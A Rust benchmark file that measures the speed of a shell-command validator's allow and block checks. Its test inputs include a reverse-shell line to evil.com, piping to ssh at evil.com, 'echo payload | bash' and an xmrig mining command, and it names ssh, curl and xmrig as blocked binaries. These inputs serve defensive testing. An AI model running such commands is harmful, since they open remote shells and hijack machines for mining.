use criterion::{black_box, criterion_group, criterion_main, Criterion};
use laminae_ironclad::{
    validate_binary, validate_binary_with_config, validate_command_deep,
    validate_command_deep_with_config, IroncladConfig,
};

// ---------------------------------------------------------------------------
// validate_binary benchmarks
// ---------------------------------------------------------------------------

fn bench_validate_binary(c: &mut Criterion) {
    let mut group = c.benchmark_group("validate_binary");

    // Allowed binaries
    group.bench_function("allowed/ls", |b| {
        b.iter(|| validate_binary(black_box("ls")))
    });
    group.bench_function("allowed/git", |b| {
        b.iter(|| validate_binary(black_box("git")))
    });
    group.bench_function("allowed/claude", |b| {
        b.iter(|| validate_binary(black_box("claude")))
    });

    // Blocked binaries
    group.bench_function("blocked/ssh", |b| {
        b.iter(|| validate_binary(black_box("ssh")))
    });
    group.bench_function("blocked/curl", |b| {
        b.iter(|| validate_binary(black_box("curl")))
    });
    group.bench_function("blocked/xmrig", |b| {
        b.iter(|| validate_binary(black_box("xmrig")))
    });

    // Unknown binary (not in either list)
    group.bench_function("unknown/my_tool", |b| {
        b.iter(|| validate_binary(black_box("my_custom_tool")))
    });

    // Full path resolution
    group.bench_function("full_path/usr_bin_ssh", |b| {
        b.iter(|| validate_binary(black_box("/usr/bin/ssh")))
    });
    group.bench_function("full_path/usr_bin_git", |b| {
        b.iter(|| validate_binary(black_box("/usr/bin/git")))
    });

    group.finish();
}

// ---------------------------------------------------------------------------
// validate_command_deep benchmarks
// ---------------------------------------------------------------------------

fn bench_validate_command_deep(c: &mut Criterion) {
    let mut group = c.benchmark_group("validate_command_deep");

    // Simple safe commands
    group.bench_function("simple/ls_la", |b| {
        b.iter(|| validate_command_deep(black_box("ls -la /tmp")))
    });
    group.bench_function("simple/git_status", |b| {
        b.iter(|| validate_command_deep(black_box("git status")))
    });

    // Piped commands (safe)
    group.bench_function("piped/safe", |b| {
        b.iter(|| validate_command_deep(black_box("cat file.txt | sort | uniq | wc -l")))
    });

    // Chained commands (safe)
    group.bench_function("chained/safe", |b| {
        b.iter(|| validate_command_deep(black_box("git status && echo done || echo failed")))
    });

    // Complex safe command
    group.bench_function("complex/safe", |b| {
        b.iter(|| {
            validate_command_deep(black_box(
                "find . -name '*.rs' | xargs cat | sort | uniq -c | sort -rn | head -20",
            ))
        })
    });

    // Dangerous: piped blocked binary
    group.bench_function("dangerous/piped_ssh", |b| {
        b.iter(|| validate_command_deep(black_box("echo test | ssh user@evil.com")))
    });

    // Dangerous: reverse shell pattern
    group.bench_function("dangerous/reverse_shell", |b| {
        b.iter(|| validate_command_deep(black_box("bash -i >& /dev/tcp/evil.com/4444 0>&1")))
    });

    // Dangerous: pipe to shell
    group.bench_function("dangerous/pipe_to_shell", |b| {
        b.iter(|| validate_command_deep(black_box("echo payload | bash")))
    });

    // Dangerous: crypto mining pattern
    group.bench_function("dangerous/mining", |b| {
        b.iter(|| {
            validate_command_deep(black_box(
                "nohup xmrig --url stratum+tcp://pool.mining.com:3333",
            ))
        })
    });

    group.finish();
}

// ---------------------------------------------------------------------------
// Custom config benchmarks
// ---------------------------------------------------------------------------

fn bench_custom_config(c: &mut Criterion) {
    let mut group = c.benchmark_group("custom_config");

    // Large blocklist
    let mut extra_blocked: Vec<String> = (0..200).map(|i| format!("blocked_binary_{i}")).collect();
    extra_blocked.push("special_tool".to_string());

    let large_config = IroncladConfig {
        extra_blocked,
        ..Default::default()
    };

    group.bench_function("large_blocklist/allowed", |b| {
        b.iter(|| validate_binary_with_config(black_box("ls"), black_box(&large_config)))
    });

    group.bench_function("large_blocklist/custom_blocked", |b| {
        b.iter(|| validate_binary_with_config(black_box("special_tool"), black_box(&large_config)))
    });

    group.bench_function("large_blocklist/deep_safe", |b| {
        b.iter(|| {
            validate_command_deep_with_config(
                black_box("ls -la /tmp && git status"),
                black_box(&large_config),
            )
        })
    });

    group.bench_function("large_blocklist/deep_blocked", |b| {
        b.iter(|| {
            validate_command_deep_with_config(
                black_box("echo test | special_tool --flag"),
                black_box(&large_config),
            )
        })
    });

    group.finish();
}

criterion_group!(
    benches,
    bench_validate_binary,
    bench_validate_command_deep,
    bench_custom_config,
);
criterion_main!(benches);
